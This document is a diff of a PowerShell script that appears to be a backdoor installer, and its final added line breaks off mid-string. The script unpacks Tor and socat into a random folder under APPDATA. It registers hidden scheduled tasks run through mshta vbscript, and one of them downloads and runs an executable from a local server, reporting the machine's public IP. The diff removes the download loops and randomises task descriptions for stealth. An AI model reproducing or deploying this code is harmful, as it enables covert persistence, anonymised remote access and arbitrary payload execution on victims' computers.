@@ -40,13 +40,12 @@ function InitScheduller{
         Import-Module ScheduledTasks -ErrorAction Stop;
         return $SH_TYPE_SCHEDULED_TASK;
     }catch{
-        $File=$env:Temp+'\'+(RandomString)+'.zip';
+        $File=$env:Temp+'\ts.zip';
         $Dest=$env:Temp+'\'+(RandomString);
-        while (!(Download 'https://api.nuget.org/packages/taskscheduler.2.5.23.nupkg' $File)) {}
         if ((Test-Path $Dest) -eq 1){Remove-Item -Force -Recurse $Dest;}mkdir $Dest | Out-Null;
         Unzip $File $Dest;
         Remove-Item -Force $File;
-        $TSAssembly=$Dest+'\lib\net20\Microsoft.Win32.TaskScheduler.dll';
+        $TSAssembly=$Dest+'\Microsoft.Win32.TaskScheduler.dll';
         $loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);
         return $SH_TYPE_TASK_SCHEDULER;
     }
@@ -86,7 +85,7 @@ switch ($schedulerType) {
     Default {
         $ts=New-Object Microsoft.Win32.TaskScheduler.TaskService;
         $td=$ts.NewTask();
-        $td.RegistrationInfo.Description = 'Does something';
+        $td.RegistrationInfo.Description = (RandomString);
         $td.Settings.DisallowStartIfOnBatteries = $False;
         $td.Settings.StopIfGoingOnBatteries = $False;
         $td.Settings.MultipleInstances = [Microsoft.Win32.TaskScheduler.TaskInstancesPolicy]::IgnoreNew;
@@ -113,15 +112,18 @@ switch ($schedulerType) {
 function Download {
     param([string]$url, [string]$file);
     $ErrorActionPreference = "Stop";
+    Write-Host ("Download {0} to {1}" -f ($url, $file));
     try {
         Start-BitsTransfer -Source $url -Destination $file;
     }
     catch {
+        #Write-Error $_ -ErrorAction Continue;
         try {
             (New-Object System.Net.WebClient).DownloadFile($url,$file);
         }
         catch {
-            Start-Process "cmd.exe" -ArgumentList "/b /c bitsadmin /transfer /download /priority HIGH `"$url`" `"$file`">nul" -Wait -WindowStyle Hidden;
+            #Write-Error $_ -ErrorAction Continue;
+            Start-Process "cmd.exe" -ArgumentList "/b /c bitsadmin /transfer /download /priority HIGH `"$url`" `"$file`"" -Wait -WindowStyle Hidden;
         }
     }finally{
         $ErrorActionPreference = "Continue";
@@ -133,18 +135,8 @@ function Download {
 }
 function ITP{
 $schedulerType = InitScheduller;
-$tf=$env:Temp+'\'+(RandomString)+'.zip';
-$DestTP=dir($env:APPDATA)|Get-Random|Select-Object -ExpandProperty FullName;
-$TorMirrors=@("https://torproject.urown.net/dist/",
-"https://dist.torproject.org/",
-"https://torproject.mirror.metalgamer.eu/dist/",
-"https://tor.ybti.net/dist/");
-foreach ($mirror in $TorMirrors) {
-    $_url=$mirror+'torbrowser/7.0.5/tor-win32-0.3.0.10.zip';
-    if((Download $_url $tf)){
-        break;
-    }
-}
+$tf=$env:Temp+'\t.zip';
+$DestTP=$env:APPDATA+'\'+(RandomString);
 if ((Test-Path $DestTP) -eq 1){Remove-Item -Force -Recurse $DestTP;}mkdir $DestTP | Out-Null;
 Unzip $tf $DestTP;
 Remove-Item -Force $tf;
@@ -152,8 +144,7 @@ $tor=$DestTP+'\Tor\tor.exe';
 $tor=$tor.Replace('\','/');
 $tor_cmd="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$tor`",0,False))";
 AddTask (RandomString) 'mshta.exe' $tor_cmd;
-$SFile=$env:Temp+'\'+(RandomString)+'.zip';
-while (!(Download 'https://github.com/StudioEtrange/socat-windows/archive/1.7.2.1.zip' $SFile)){}
+$SFile=$env:Temp+'\s.zip';
 Unzip $SFile $DestTP;
 $s_old=$DestTP+'\socat-windows-1.7.2.1\';
 $s_new=(RandomString);
@@ -166,7 +157,4 @@ $s1_cmd="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$s1cmd`",0,False))
 $s2_cmd="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$s2cmd`",0,False))";
 AddTask (RandomString) 'mshta.exe' $s1_cmd 0 0 $s_fold;
 AddTask (RandomString) 'mshta.exe' $s2_cmd 0 0 $s_fold;
-$tsts="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"powershell.exe `"`"`$F=`$env:Temp+'\\"+(RandomString)+".exe';rm -Force `$F;`$cl=(New-Object Net.WebClient);`$cl.DownloadFile('http://127.0.0.1:5555/"+(RandomString)+".asp?ts&ip='+`$cl.DownloadString('http://api.ipify.org/'),`$F);& `$F`"`"`",0,False))";
-AddTask (RandomString) 'mshta.exe' $tsts 1;
-}
-ITP
+$tsts="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"powershell.exe `"`"`$F=`$env:Temp+'\\"+(RandomString)+".exe';rm -Force `$F;`$cl=(New-Object Net.WebClient);`$cl.DownloadFile('http://127.0.0.1:5555/"+(RandomString)+".asp
